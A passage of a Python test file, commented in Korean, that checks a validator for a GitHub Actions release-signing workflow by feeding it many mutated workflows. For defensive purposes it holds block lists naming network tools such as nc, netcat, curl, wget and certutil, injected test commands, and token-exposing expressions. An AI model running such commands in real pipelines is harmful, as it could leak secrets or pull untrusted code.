                            ("sh", "sh x.sh"), ("env", "env"), ("cat", "cat x"), ("echo 를 임의 파일에 덧붙임", "echo hi >> /tmp/x"), ("echo 를 임의 파일에 씀", "echo hi > /tmp/x"), ("echo 를 VERSION 에 씀", "echo 9.9.9 > VERSION"),
                            ("낱말 가운데 # 뒤의 curl", "echo a#b; curl x")):
            add(f"Q sign 잡에 {label}", inject_sign(line), "W-8")
        add("Q 서명 명령 뒤에 허용 명령이 더 옴(cd)", run_replace(SIGN_CMD, SIGN_CMD, 'cd "$RUNNER_TEMP/release"'), "X-1", "구조")
        add("Q 서명 명령 앞에 허용 명령이 옴(cd)", run_replace(SIGN_CMD, 'cd "$RUNNER_TEMP/release"', SIGN_CMD), "X-1", "구조")
        add("Q 서명 명령이 두 번", run_replace(SIGN_CMD, SIGN_CMD, SIGN_CMD), "X-1", "구조")
        for label, expression in (("github['token'] 대괄호", "${{ github['token'] }}"), ("fromJSON 식", "${{ fromJSON('{}') }}"), ("toJSON(github)", "${{ toJSON(github) }}"), ("env.GITHUB_TOKEN 글자", "${{ env.GITHUB_TOKEN }}"),
                                  ("github . token 사이를 띄움", "${{ github . token }}")):
            add(f"Q W-4 의 {label}", env_extra(expression), "W-4")

        add("X-3 setup-python 의 with 안에 if 키", mutate_build(SETUP_STEP, SETUP_STEP.replace("          python-version: '3.12'\n", "          python-version: '3.12'\n          if: always()\n")), "X-3", "W-6", "구조")
        add("X-3 잡 수준 defaults 로 셸을 바꿈", mutate_build("    timeout-minutes: 45\n", "    timeout-minutes: 45\n    defaults:\n      run:\n        shell: pwsh\n"), "X-3", "구조")
        add("X-3 단계 이름이 겹침", mutate_build("      - name: 사전 점검\n", "      - name: 가져오기\n"), "X-3", "구조")
        add("X-3 단계가 매핑이 아닌 글", mutate_build(step_text("가져오기"), "      - 가져오기\n\n"), "X-3", "구조")
        add("X-3 단계에 id 키", mutate_build(PACKAGE_STEP, PACKAGE_STEP + "        id: x\n"), "X-3", "구조")
        add("X-3 최상위 env 추가", mutate("jobs:\n", "env:\n  X: '1'\n\njobs:\n"), "X-3", "구조")
        return v

    def test_the_real_text_is_clean_and_every_variant_is_caught_by_the_rule_it_breaks(self):
        self.assertEqual(support.release_violations(REAL), [])
        variants = self.variants()
        self.assertGreaterEqual(len(variants), 100)
        for label, (text, rules) in variants.items():
            with self.subTest(variant=label):
                self.assertNotEqual(text, REAL, label + ": 변형이 글을 바꾸지 않았다")
                problems = support.release_violations(text)
                self.assertNotEqual(problems, [], label + " 는 걸려야 한다")
                for rule in rules:
                    self.assertTrue(any(problem.startswith(rule + ":") or problem.startswith(rule + " ") for problem in problems), (label, rule, problems[:8]))

    def test_every_rule_is_exercised_by_enough_variants(self):
        counts = {}
        for _label, (_text, rules) in self.variants().items():
            for rule in rules:
                counts[rule] = counts.get(rule, 0) + 1
        for number in range(1, 17):
            self.assertGreaterEqual(counts.get(f"W-{number}", 0), 2, f"W-{number} 을 시험하는 나쁜 글이 둘 이상이어야 한다")
        self.assertGreaterEqual(counts.get("구조", 0), 20)
        for rule in ("X-1", "X-2", "X-3"):
            self.assertGreaterEqual(counts.get(rule, 0), 4, rule)
        for number, minimum in ((1, 8), (3, 10), (4, 8), (5, 6), (6, 10), (8, 12), (9, 10), (11, 6), (15, 6)):
            self.assertGreaterEqual(counts.get(f"W-{number}", 0), minimum, f"W-{number}")
        for number, minimum in ((4, 30), (6, 10), (8, 60), (9, 20), (10, 6), (15, 30)):                             # 재작업 1(결정 D-888)이 규칙 단독으로 걸리게 넓힌 규칙들 — 변형 표본이 줄지 않게
            self.assertGreaterEqual(counts.get(f"W-{number}", 0), minimum, f"W-{number} (재작업 1 표본)")
        self.assertGreaterEqual(counts.get("X-3", 0), 6)

    def test_the_messages_name_the_rule_that_was_broken(self):
        text = " ".join(support.release_violations(mutate("on:\n  workflow_dispatch:\n", "on:\n  workflow_dispatch:\n  push:\n")))
        self.assertIn("W-1:", text)
        self.assertIn("workflow_dispatch", text)
        self.assertIn("retention-days", " ".join(support.release_violations(mutate("          retention-days: 1\n", "          retention-days: 30\n"))))
        self.assertIn("SHA", " ".join(support.release_violations(mutate(CHECKOUT, "actions/checkout@v4", 2))))
        self.assertIn("--draft", " ".join(support.release_violations(mutate_sign(" --draft ", " ", 2))))
        self.assertIn("허용 목록", " ".join(support.release_violations(inject_sign("curl -O x"))))
        self.assertIn("전체 커밋 SHA", " ".join(support.release_violations(mutate_sign('--target "$TARGET_SHA"', "--target main", 2))))

    def test_a_workflow_with_nothing_wrong_in_a_different_but_equal_spelling_still_passes(self):
        more_comments = REAL.replace("# 이 파일은 초안까지만 만든다", "# 주석 줄을 앞에 하나 더 둔다\n# 이 파일은 초안까지만 만든다", 1)
        self.assertEqual(support.release_violations(more_comments), [])
        self.assertEqual(support.release_violations(REAL.replace("  # v4.4.0", "   # v4.4.0")), [], "SHA 뒤 주석 앞 공백 수는 상관없다")
        self.assertEqual(support.release_violations(REAL.rstrip("\n") + "\n\n\n"), [], "끝의 빈 줄 수는 상관없다")


class UnicodeSpaceAndCaseTest(unittest.TestCase):
    """독립 검증 S 의 S-1(필수)·I-12(결정 D-887)·R-3(결정 D-888) — 읽개가 줄 끝의 유니코드 공백(NBSP·U+3000 …)을 자르지 않으니 값이 달라져 정해진 값과의 견주기가 걸리고, 식의 낱말 찾기는 대소문자를 가리지 않으며,
    달러 두 중괄호 식은 정해진 자리의 정해진 식뿐이다."""

    def test_a_unicode_space_ending_any_code_line_never_passes_the_checker(self):
        """진짜 글의 코드 줄마다 끝에 NBSP·U+3000 을 하나 붙인 변형이 모두 걸린다 — 값이 달라지거나 읽개가 거절한다. 줄 끝 주석(` #`)이 있는 줄(액션 버전 주석 여섯)은 글자가 주석 안에 들어가 값이 안 바뀌어 따로 본다."""
        lines = REAL.split("\n")
        checked = 0
        for number, line in enumerate(lines):
            if not line.strip(" ") or line.lstrip(" ").startswith("#") or " #" in line:
                continue
            for ch in (chr(0xA0), chr(0x3000)):
                text = "\n".join(lines[:number] + [line + ch] + lines[number + 1:])
                with self.subTest(line=number + 1, character=hex(ord(ch))):
                    self.assertNotEqual(support.release_violations(text), [], line.strip()[:60])
                checked += 1
        self.assertGreater(checked, 200)

    def test_a_unicode_space_inside_a_trailing_version_comment_is_the_one_harmless_place(self):
        lines = REAL.split("\n")
        commented = [number for number, line in enumerate(lines) if " #" in line and not line.lstrip(" ").startswith("#")]
        self.assertEqual(len(commented), 6, "줄 끝에 버전 주석이 있는 줄은 액션 여섯 곳뿐이다")
        for number in commented:
            self.assertIn("uses: actions/", lines[number])
            text = "\n".join(lines[:number] + [lines[number] + chr(0xA0)] + lines[number + 1:])
            self.assertEqual(support.release_violations(text), [], "주석 안의 글자는 값이 아니다")

    def test_a_backslash_followed_by_a_unicode_space_does_not_join_the_next_line_and_is_one_literal_character(self):
        for ch in (chr(0xA0), chr(0x3000)):
            commands = support.shell_commands("echo hi " + chr(0x5C) + ch + "\nrm x")
            self.assertEqual([command["words"] for command in commands], [["echo", "hi", ch], ["rm", "x"]])

    def test_the_secret_and_token_word_lists_ignore_case_and_keep_their_word_boundaries(self):
        for text in ("${{ secrets.X }}", "${{ SECRETS.X }}", "${{ Secrets.X }}", "secrets['X']", "SECRETS['X']"):
            self.assertTrue(support.WORD_SECRETS.search(text), text)
        for text in ("${{ github.token }}", "${{ GITHUB.token }}", "${{ github.TOKEN }}", "${{ github . Token }}", "${{ GITHUB['token'] }}", "${{ toJSON(github) }}", "${{ toJson(github) }}", "${{ tojson(github) }}",
                     "${{ fromJSON(x) }}", "${{ fromjson(x) }}", "GITHUB_TOKEN", "github_token"):
            self.assertTrue(support.TOKEN_WORDS.search(text), text)
        for text in ("mysecrets", "secrets-store", "no_secret_here", "my-secrets"):
            self.assertIsNone(support.WORD_SECRETS.search(text), text)

    def test_the_other_secret_pattern_ignores_case_in_the_context_name_but_not_in_the_allowed_secret_name(self):
        text = "${{ SECRETS.OTHER }}"
        self.assertTrue(any("UPDATE_SIGNING_KEY 가 아닌 비밀" in problem for problem in support.w4({"jobs": {"build": {"env": {"K": text}}}})))
        tree = {"jobs": {"build": {"env": {"K": "${{ secrets.update_signing_key }}"}}}}
        self.assertTrue(any("UPDATE_SIGNING_KEY 가 아닌 비밀" in problem for problem in support.w4(tree)), "허용된 비밀 이름은 정확한 철자만 받는다")
        self.assertFalse(any("UPDATE_SIGNING_KEY 가 아닌 비밀" in problem for problem in support.w4({"jobs": {"build": {"env": {"K": "${{ secrets.UPDATE_SIGNING_KEY }}"}}}})))

    def test_the_expression_sites_of_the_real_workflow_are_exactly_the_thirteen_the_rules_name(self):
        found = []
        for path, kind, text in support._walk(yamlsub.load(REAL)):
            if "${{" in text:
                self.assertTrue(support._expression_site_ok(path, kind, text), (path, text))
                found += [expression for expression in support.EXPRESSION.findall(text)]
        counts = {}
        for expression in found:
            counts[expression] = counts.get(expression, 0) + 1
        self.assertEqual(counts, {"${{ github.token }}": 4, "${{ github.sha }}": 1, "${{ secrets.UPDATE_SIGNING_KEY }}": 1, "${{ runner.temp }}": 7})

    def test_the_target_rule_names_a_missing_or_swallowed_target_without_crashing(self):
        """`--target` 이 하나도 없는 글(또는 `--title` 이 먹어 버린 글)에서도 W-10 이 예외 없이 자기 문장을 낸다 — 예외는 검사기의 안전망이 같은 이름표로 바꿔 주지만 문장이 사라진다."""
        tree = yamlsub.load(REAL.replace(' --target "$TARGET_SHA"', "").replace("--target ", ""))
        self.assertTrue(any("정확히 하나" in problem for problem in support.w10(tree)), support.w10(tree))
        tree = yamlsub.load(REAL.replace('--target "$TARGET_SHA" --title "ChanceBlog Desktop ${version}"', '--title --target "$TARGET_SHA"'))
        self.assertTrue(any("정확히 하나" in problem for problem in support.w10(tree)), support.w10(tree))
        self.assertEqual(support.w10(yamlsub.load(REAL)), [])

    def test_the_expression_site_function_accepts_only_the_named_places(self):
        ok = support._expression_site_ok
        env_path = ("jobs", "build", "steps", 1, "env", "GH_TOKEN")
        self.assertTrue(ok(env_path, "값", "${{ github.token }}"))
        self.assertFalse(ok(env_path, "값", "${{ github.sha }}"), "다른 칸의 식은 이 칸에 못 온다")
        self.assertFalse(ok(env_path, "키", "${{ github.token }}"))
        self.assertFalse(ok(("jobs", "build", "steps", 1, "env", "K"), "값", "${{ github.token }}"))
        self.assertFalse(ok(("jobs", "build", "steps", 1, "run"), "값", "${{ github.token }}"))
        self.assertFalse(ok(("jobs", "build", "name"), "값", "${{ github.token }}"))
        self.assertFalse(ok(("jobs", "build", "env", "GH_TOKEN"), "값", "${{ github.token }}"), "잡 수준 env 는 자리가 아니다")
        path = ("jobs", "build", "steps", 7, "with", "path")
        self.assertTrue(ok(path, "값", "${{ runner.temp }}/release/a\n${{ runner.temp }}/release/b\n"))
        self.assertFalse(ok(path, "값", "${{ runner.temp }}/release/a\n${{ github.workspace }}/b\n"))
        self.assertFalse(ok(path, "값", "${{ runner.temp }}/a ${{"))
        self.assertFalse(ok(path, "값", "${{ runner.temp }}/a }}"))
        self.assertFalse(ok(("jobs", "build", "steps", 7, "with", "name"), "값", "${{ runner.temp }}"))


def find_bash():
    if os.name != "nt":
        return shutil.which("bash")
    candidates = []
    git = shutil.which("git")
    if git:
        top = Path(git).resolve().parent.parent
        candidates += [top / "bin" / "bash.exe", top / "usr" / "bin" / "bash.exe"]
    for name in ("ProgramFiles", "ProgramFiles(x86)"):
        if os.environ.get(name):
            candidates.append(Path(os.environ[name]) / "Git" / "bin" / "bash.exe")
    for candidate in candidates:
        if candidate.is_file():
            return str(candidate)
    return None


BASH = find_bash()
needs_bash = unittest.skipUnless(BASH, "bash 가 없어 단계의 셸 스크립트를 돌려 보지 못했다(Actions 의 ubuntu 에는 있고 윈도 러너에는 Git Bash 가 있다)")
# 가짜 gh: 셸 함수라 PATH·실행 비트·윈도 경로 문제가 없다. 부른 인자를 `calls.log` 에 한 줄씩(탭으로 나눠) 남기고 `FAKE_TAG`·`FAKE_RELEASES` 가 fail 이면 실패(종료 코드 1)한다.
FAKE_GH = r'''
gh() {
  { printf 'CALL'; for arg in "$@"; do printf '\t%s' "$arg"; done; printf '\n'; } >> "$FAKE_DIR/calls.log"
  case "$2" in
    */git/matching-refs/*) if [[ "${FAKE_TAG:-ok}" == fail ]]; then return 1; fi; return 0 ;;
    */releases*) if [[ "${FAKE_RELEASES:-ok}" == fail ]]; then return 1; fi; echo "ChanceBlogDesktop-1.0.0-Setup.exe 123"; return 0 ;;
  esac
  return 99
}
'''
POST_STEP_NAME = "사후 점검(초안이 있고 태그는 아직 없다)"


class PostCheckShapeTest(unittest.TestCase):
    """독립 검증 S 의 R-8(결정 D-889): 사후 점검의 태그 확인이 `if gh api … > /dev/null 2>&1` 라서 403·5xx·속도 제한·네트워크 오류도 '태그 없음' 으로 읽어 통과했다 —
    이제 `git/matching-refs`(응답 200 + 빈 결과가 정상)를 읽고 오류는 단계 실패, 같은 이름의 태그가 있으면 jq 의 `error` 로 단계 실패다. 릴리스 목록은 최신 100개(첫 쪽 — 새 초안은 가장 최신이다)를 읽는다."""

    def body(self):
        steps = yamlsub.load(REAL)["jobs"]["sign-and-draft"]["steps"]
        return next(step["run"] for step in steps if step["name"] == POST_STEP_NAME)

    def test_the_step_asks_matching_refs_and_the_release_list_and_never_hides_a_failure(self):
        body = self.body()
        commands = support.shell_commands(body)
        gh_calls = [command for command in commands if command["words"][:1] == ["gh"]]
        self.assertEqual(len(gh_calls), 2)
        self.assertTrue(all(command["redirects"] == [] for command in gh_calls), "gh 의 출력·오류를 버리는 방향 바꾸기가 없다")
        tag_words, release_words = (command["words"] for command in gh_calls)
        self.assertEqual(tag_words[:3], ["gh", "api", "repos/${GITHUB_REPOSITORY}/git/matching-refs/tags/v${version}"])
        self.assertEqual(tag_words[3:5], ["--paginate", "--jq"])
        self.assertIn('select(.ref == "refs/tags/v${version}")', tag_words[5])
        self.assertTrue(tag_words[5].rstrip().endswith('")'), "같은 이름의 태그가 있으면 error 로 끝난다")
        self.assertIn("error(", tag_words[5])
        self.assertEqual(release_words[:3], ["gh", "api", "repos/${GITHUB_REPOSITORY}/releases?per_page=100"])
        self.assertEqual(release_words[3], "--jq")
        self.assertIn("length == 1", release_words[4])
        self.assertIn("(.[0].assets | length) == 7", release_words[4])
        self.assertIn("error(", release_words[4])
        firsts = [command["words"][0] for command in commands]
        self.assertEqual(["re" if word.startswith("re=") else word for word in firsts], ["read", "[[", "re", "[[", "exit", "gh", "gh"], "if·then 틀 없이 읽기·확인·gh 두 번뿐이다(조건문 속 gh 는 실패를 삼킨다)")
        for needle in ("git/ref/tags", "/dev/null", "2>&1", "|| true", "set +e", "&&"):
            self.assertNotIn(needle, body, needle)
        self.assertEqual(body.count("||"), 2, "`||` 는 VERSION 읽기 두 줄에만 있다(읽기 줄의 끝 줄바꿈 대비와 버전 모양 확인의 exit 1)")


@needs_bash
class PostCheckBehaviorTest(unittest.TestCase):
    """진짜 bash 로 사후 점검 단계의 `run` 을 돌린다(가짜 `gh` 는 셸 함수 — 인자를 기록하고 정한 대로 성공·실패한다. 실제 GitHub·접속 없음). 옛 단계는 태그 확인이 실패해도 통과했다."""

    REPO = "owner/repo"
    TAG_JQ = '.[] | select(.ref == "refs/tags/v1.0.0") | error("태그가 이미 있다 - 초안이 태그를 만들었을 수 있다. 공개하지 말고 운영자에게 알린다")'
    RELEASE_JQ = ('map(select(.draft and .tag_name == "v1.0.0")) | if length == 1 and (.[0].assets | length) == 7 then .[0].assets[] | "' + chr(92) + '(.name) ' + chr(92)
                  + '(.size)" else error("초안이 정확히 하나가 아니거나 자산이 일곱 개가 아니다") end')

    @classmethod
    def setUpClass(cls):
        cls._tmp = tempfile.TemporaryDirectory()
        cls.addClassCleanup(cls._tmp.cleanup)
        steps = yamlsub.load(REAL)["jobs"]["sign-and-draft"]["steps"]
        cls.script = next(step["run"] for step in steps if step["name"] == POST_STEP_NAME)
        cls.count = 0

    def run_step(self, version="1.0.0\n", tag="ok", releases="ok"):
        type(self).count += 1
        folder = Path(self._tmp.name) / f"case{self.count}"
        folder.mkdir()
        (folder / "VERSION").write_bytes(version.encode("utf-8"))
        script = folder / "step.sh"
        script.write_bytes((FAKE_GH + self.script).replace("\r\n", "\n").encode("utf-8"))
        env = {key: value for key, value in os.environ.items() if not key.startswith(("GITHUB_", "RUNNER_", "FAKE_")) and key not in ("GH_TOKEN", "BASH_ENV")}
        env.update(GITHUB_REPOSITORY=self.REPO, GH_TOKEN="not-a-real-token", FAKE_DIR=folder.as_posix(), FAKE_TAG=tag, FAKE_RELEASES=releases)
        done = subprocess.run([BASH, "--noprofile", "--norc", "-eo", "pipefail", script.as_posix()], cwd=folder, env=env, capture_output=True, timeout=120, stdin=subprocess.DEVNULL)
        log = folder / "calls.log"
        calls = [line.split("\t")[1:] for line in log.read_text(encoding="utf-8").splitlines()] if log.exists() else []
        return done.returncode, calls, (done.stdout + done.stderr).decode("utf-8", "replace")

    def test_when_both_questions_are_answered_the_step_passes_after_exactly_those_two_calls(self):
        code, calls, out = self.run_step()
        self.assertEqual(code, 0, out)
        self.assertEqual([call[:2] for call in calls], [["api", "repos/owner/repo/git/matching-refs/tags/v1.0.0"], ["api", "repos/owner/repo/releases?per_page=100"]])
        self.assertEqual(calls[0][2:4], ["--paginate", "--jq"])
        self.assertEqual(calls[0][4:], [self.TAG_JQ])
        self.assertEqual(calls[1][2], "--jq")
        self.assertEqual(calls[1][3:], [self.RELEASE_JQ])

    def test_an_api_failure_on_the_tag_question_fails_the_step_and_the_release_list_is_never_asked(self):
        code, calls, out = self.run_step(tag="fail")
        self.assertNotEqual(code, 0, "403·5xx·속도 제한·네트워크 오류를 '태그 없음' 으로 읽으면 안 된다\n" + out)
        self.assertEqual(len(calls), 1)

    def test_an_api_failure_on_the_release_list_fails_the_step(self):
        code, calls, out = self.run_step(releases="fail")
        self.assertNotEqual(code, 0, out)
        self.assertEqual(len(calls), 2)

    def test_a_candidate_version_is_asked_with_its_own_tag_and_a_missing_final_newline_is_read(self):
        code, calls, out = self.run_step(version="0.9.0-rc.1")
        self.assertEqual(code, 0, out)
        self.assertEqual(calls[0][1], "repos/owner/repo/git/matching-refs/tags/v0.9.0-rc.1")
        self.assertIn('"refs/tags/v0.9.0-rc.1")', calls[0][4])
        self.assertIn('.tag_name == "v0.9.0-rc.1"', calls[1][3])

    def test_a_version_text_of_the_wrong_shape_stops_before_any_gh_call(self):
        for bad in ("1.0\n", "1.0.0;echo\n", ""):                                       # 모양 정규식 자체는 위 시험(`test_both_steps_that_use_the_version_check…`)이 더 많은 나쁜 글로 견준다 — 여기는 셸이 실제로 멈추는지만(bash 프로세스는 느리다)
            with self.subTest(version=bad):
                code, calls, out = self.run_step(version=bad)
                self.assertNotEqual(code, 0, out)
                self.assertEqual(calls, [])


class RuleConstantsAreWrittenDownTest(unittest.TestCase):
    """규칙의 허용·금지 상수를 `ALLOWED_UPLOAD_FILES` 처럼 **정확히** 못박는다 — 낱말 하나를 더하거나 빼는 변경이 시험을 빨갛게 한다(독립 검증 Q 의 권고 2·3: K23·K27·K53에서 K57 이 시험을 모두 통과했다).
    상수를 바꾸는 사람은 이 목록과 문서를 같이 고친다."""

    def test_the_command_words_the_two_jobs_may_call_are_exactly_these(self):
        self.assertEqual(support.SIGN_ALLOWED_COMMANDS, ("python", "gh", "sha256sum", "[[", "cd", "echo", "read", "exit"))
        self.assertEqual(support.BUILD_ALLOWED_COMMANDS, ("python", "echo", "cat"))
        self.assertEqual((support.SUMMARY_REDIRECT, support.VERSION_REDIRECT), ((">>", "$GITHUB_STEP_SUMMARY"), ("<", "VERSION")))
        self.assertEqual(support.CONTROL_WORDS, frozenset({"if", "then", "elif", "else", "fi", "do", "done", "while", "until", "for", "in", "case", "esac", "!", "{", "}", "time"}))
        self.assertEqual((support.GH_CREATE_FLAGS, support.GH_CREATE_VALUES), (("--draft", "--prerelease"), ("--repo", "--target", "--title", "--notes-file")))
        self.assertEqual((support.REPOSITORY_WORDS, support.GH_CREATE_TAG), (("$GITHUB_REPOSITORY", "${GITHUB_REPOSITORY}"), "v${version}"))

    def test_the_sha_pin_pattern_takes_exactly_forty_lowercase_hex_digits(self):
        """독립 검증 Q 의 K58: 승인된 액션 쌍 검사가 같은 글을 같은 이름표로 잡아서 SHA 모양 정규식을 7자리부터 받게 풀어도 시험이 통과했다."""
        pin = "actions/checkout@"
        self.assertTrue(support.SHA_PIN.match(pin + "0123456789abcdef0123456789abcdef01234567"))
        for bad in ("0123456", "0123456789abcdef0123456789abcdef0123456", "0123456789abcdef0123456789abcdef012345678", "0123456789ABCDEF0123456789ABCDEF01234567", "v4", ""):
            with self.subTest(pin=bad):
                self.assertIsNone(support.SHA_PIN.match(pin + bad))

    def test_the_download_words_and_the_forbidden_text_are_exactly_these(self):
        self.assertEqual(support.DOWNLOAD_WORDS, ("pip", "pip3", "npm", "npx", "yarn", "pnpm", "curl", "wget", "nuget", "choco", "winget", "scoop", "dotnet", "brew", "apt", "apt-get", "Invoke-WebRequest", "Invoke-RestMethod", "iwr", "irm",
                                                  "Start-BitsTransfer", "bitsadmin", "certutil", "pwsh", "powershell", "docker", "cargo",
                                                  "nc", "ncat", "netcat", "aria2c", "ssh", "scp", "sftp", "rsync", "ftp", "telnet", "perl", "msiexec", "uvx", "pipx", "easy_install", "conda", "mamba", "gem"))
        self.assertEqual(support.FORBIDDEN_TEXT, ("--publish", "--draft=false", "--draft =", "release edit", "release upload", "release delete", "release download"))
        self.assertEqual(len(support.DOWNLOAD_PHRASES), 4)
        self.assertTrue(all(pattern.flags & re.IGNORECASE for pattern in support.DOWNLOAD_PHRASES), "문구 찾기도 대소문자를 가리지 않는다")

    def test_every_download_word_is_caught_in_the_sign_job_and_in_the_build_job_and_every_phrase_too(self):
        """낱말마다·문구마다 따로 — 하나를 목록에서 빼면 W-15 가 그 낱말의 글을 놓친다. build 잡의 나머지 단계는 허용 명령 목록으로도 걸리므로 낱말 찾기만 따로 본다(`_download_hits`)."""
        for word in support.DOWNLOAD_WORDS:
            with self.subTest(word=word):
                self.assertTrue(support._download_hits(word + " x"), word)
                self.assertTrue(support._download_hits("echo a | " + word.upper() + " x"), word + " (대문자·파이프 뒤)")
        phrases = ("python -m pip install x", "python3.12 -m pip install x", "python.exe -m ensurepip", "git clone x", "git fetch o", "git pull", "git submodule update", "git remote add o x", "git ls-remote o", "git lfs pull",
                   "gh extension install x/y", "gh release download v1", "gh run download 1", "gh repo clone x/y", "gh auth login", "openssl s_client -connect x:443")
        for phrase in phrases:
            with self.subTest(phrase=phrase):
                self.assertTrue(support._download_hits(phrase), phrase)
                self.assertTrue(support._download_hits(phrase.upper()), phrase + " (대문자)")
        for fine in ("python scripts/release_preflight.py", "git rev-parse HEAD", "gh api repos/x --jq .", "openssl version"):
            with self.subTest(fine=fine):
                self.assertEqual(support._download_hits(fine), [], fine)

    def test_the_sign_job_refuses_each_phrase_and_word_through_the_download_rule_label_too(self):
        for line in ("docker run x", "cargo install x", "pnpm i", "yarn add x", "npx x", "git fetch o", "git pull", "git submodule update", "git remote add o x", "python -m ensurepip", "openssl s_client -connect x:443"):
            with self.subTest(line=line):
                text = inject_sign(line)
                self.assertTrue(any(problem.startswith("W-15:") for problem in support.release_violations(text)), line)
                self.assertTrue(any(problem.startswith("W-15:") for problem in support.release_violations(inject_build(line))), line + " (build)")

    def test_a_rule_that_crashes_becomes_a_violation_and_never_a_pass(self):
        """독립 검증 Q 의 K75: `release_violations` 의 예외 처리 길을 지나는 시험이 없었다 — 규칙이 모르는 모양에서 예외를 내도 통과로 넘기지 않고 '검사 중 예외' 문장으로 적는다."""
        def boom(*_args):
            raise RuntimeError("일부러")
        with mock.patch.object(support, "CHECKS", (("W-1", boom),)):
            problems = support.release_violations(REAL)
        self.assertTrue(any(problem.startswith("W-1: 검사 중 예외 RuntimeError") for problem in problems), problems[:3])
        for name in ("structure", "w7", "w9", "w16"):
            with self.subTest(rule=name):
                with mock.patch.object(support, name, boom):
                    problems = support.release_violations(REAL)
                self.assertTrue(any("검사 중 예외 RuntimeError" in problem for problem in problems), (name, problems[:3]))
        self.assertEqual(support.release_violations(REAL), [], "되돌린 뒤에는 다시 통과한다")


class RuleMessageTest(unittest.TestCase):
    """겹쳐서 걸리던 규칙 안의 검사 하나하나가 **자기 문장**을 낸다 — 독립 검증 Q 의 K06·K18·K19·K71·K72(검사 하나를 꺼도 같은 글을 다른 검사가 같은 이름표로 대신 잡아 시험이 통과했다).
    변형 시험은 이름표만 보므로 규칙 함수를 직접 불러 문장 조각을 본다."""

    PIN = "0123456789abcdef0123456789abcdef01234567"

    def tree(self):
        return yamlsub.load(REAL)

    def test_w3_names_a_write_permission_outside_the_sign_job_on_its_own(self):
        tree = self.tree()
        tree["jobs"]["build"]["permissions"] = {"contents": "write", "actions": "read"}
        self.assertTrue(any("쓰기 권한은" in problem for problem in support.w3(tree)), support.w3(tree))

    def test_w5_names_the_shape_the_sha_the_owner_and_the_approved_pair_each_with_its_own_reason(self):
        cases = (("docker://alpine@" + self.PIN, "소유자/저장소@커밋"), ("./local@" + self.PIN, "소유자/저장소@커밋"), ("../up@" + self.PIN, "소유자/저장소@커밋"), ("/abs@" + self.PIN, "소유자/저장소@커밋"),
                 ("actions/checkout", "소유자/저장소@커밋"), ("actions/checkout@v4", "전체 커밋 SHA"), ("other/checkout@" + self.PIN, "허용 목록"), ("actions/checkout@" + self.PIN, "승인된 SHA"))
        for ref, fragment in cases:
            with self.subTest(ref=ref):
                tree = self.tree()
                tree["jobs"]["build"]["steps"][0]["uses"] = ref
                self.assertTrue(any(fragment in problem for problem in support.w5(tree)), (ref, support.w5(tree)))
        tree = self.tree()
        tree["jobs"]["build"]["uses"] = "./.github/workflows/other.yml"
        self.assertTrue(any("잡 수준 uses" in problem for problem in support.w5(tree)))

    def test_the_structure_names_a_changed_action_set_and_a_flow_key_each_with_its_own_reason(self):
        tree = self.tree()
        tree["jobs"]["build"]["steps"][0]["uses"] = "actions/setup-python@" + support.ACTIONS["actions/setup-python"]
        self.assertTrue(any("이 쓰는 액션이 정해진 셋" in problem for problem in support.structure(tree)), support.structure(tree))
        tree = self.tree()
        tree["jobs"]["build"]["steps"][2]["with"]["if"] = "always()"
        self.assertTrue(any("흐름을 바꾸는 키(if)" in problem for problem in support.structure(tree)), support.structure(tree))
        tree = self.tree()
        tree["jobs"]["sign-and-draft"]["steps"].append({"name": "하나 더", "run": "echo x"})
        self.assertTrue(any("정해진 13 단계와 다르다" in problem for problem in support.structure(tree)), support.structure(tree))


class SkeletonRuleTest(unittest.TestCase):
    """규칙 X-3(뼈대)의 각 검사가 따로 그 문장을 낸다 — 검사 하나를 꺼도 다른 검사가 대신 같은 이름표로 걸리는 변형이 있어서 문장까지 확인한다(독립 검증 S 의 YML07·YML53·YML62·YML68, 결정 D-888)."""

    def tree(self):
        return yamlsub.load(REAL)

    def messages(self, tree):
        return " | ".join(support.x3(tree))

    def test_the_real_tree_has_no_skeleton_problem(self):
        self.assertEqual(support.x3(self.tree()), [])

    def test_each_skeleton_check_names_its_own_problem(self):
        cases = []
        tree = self.tree()
        tree["env"] = {}
        cases.append(("최상위 키", tree, "최상위 키가 정해진 여섯"))
        tree = self.tree()
        tree["jobs"]["build"]["defaults"] = {}
        cases.append(("잡 키", tree, "잡의 키가 정해진 것"))
        tree = self.tree()
        tree["jobs"]["build"]["steps"][2]["with"]["if"] = "always()"
        cases.append(("흐름 키(with 안)", tree, "흐름을 바꾸는 키(if)"))
        tree = self.tree()
        tree["jobs"]["sign-and-draft"]["if"] = "always()"
        cases.append(("흐름 키(잡)", tree, "흐름을 바꾸는 키(if)"))
        tree = self.tree()
        tree["jobs"]["build"]["steps"][0] = "가져오기"
        cases.append(("단계가 글", tree, "매핑이 아니다"))
        tree = self.tree()
        tree["jobs"]["build"]["steps"][1]["id"] = "x"
        cases.append(("단계 키", tree, "허용되지 않은 키가 있다"))
        tree = self.tree()
        tree["jobs"]["build"]["steps"][1]["name"] = tree["jobs"]["build"]["steps"][0]["name"]
        cases.append(("같은 이름", tree, "같은 이름의 단계가 둘 이상"))
        tree = self.tree()
        del tree["jobs"]["build"]["steps"][1]["name"]
        cases.append(("이름 없음", tree, "이름이 없다"))
        tree = self.tree()
        tree["jobs"]["build"]["steps"] = "x"
        cases.append(("steps 가 글", tree, "steps 가 목록이 아니다"))
        for label, tree, fragment in cases:
            with self.subTest(case=label):
                self.assertIn(fragment, self.messages(tree))


class ApprovedActionListTest(unittest.TestCase):
    """`workflow_golden` 의 승인 목록에 새 액션 하나만 더한 것이 다른 워크플로의 승인을 넓히지 않는다 — 기존 시험(`test_repo_layout`·`test_workflow_golden`)이 모든 워크플로의 액션을 이 목록과 견주기 때문이다."""

    def test_the_old_three_are_untouched_and_the_new_one_is_a_separate_constant(self):
        self.assertEqual(set(golden.ACTIONS), {"actions/checkout", "actions/setup-python", "actions/upload-artifact"})
        self.assertEqual(set(golden.RELEASE_ONLY_ACTIONS), {"actions/download-artifact"})
        self.assertEqual(len(golden.APPROVED_REFS), 4)

    def test_ci_and_package_workflows_still_refuse_the_new_action_in_their_step_lists(self):
        ci = (ROOT / ".github" / "workflows" / "ci.yml").read_bytes().decode("utf-8").replace("\r\n", "\n")
        package = (ROOT / ".github" / "workflows" / "package.yml").read_bytes().decode("utf-8").replace("\r\n", "\n")
        swapped_ci = ci.replace("actions/setup-python@" + APPROVED["actions/setup-python"][0], DOWNLOAD)
        swapped_package = package.replace("actions/upload-artifact@" + APPROVED["actions/upload-artifact"][0], DOWNLOAD)
        self.assertEqual(golden.ci_problems(ci), [])
        self.assertEqual(golden.package_problems(package), [])
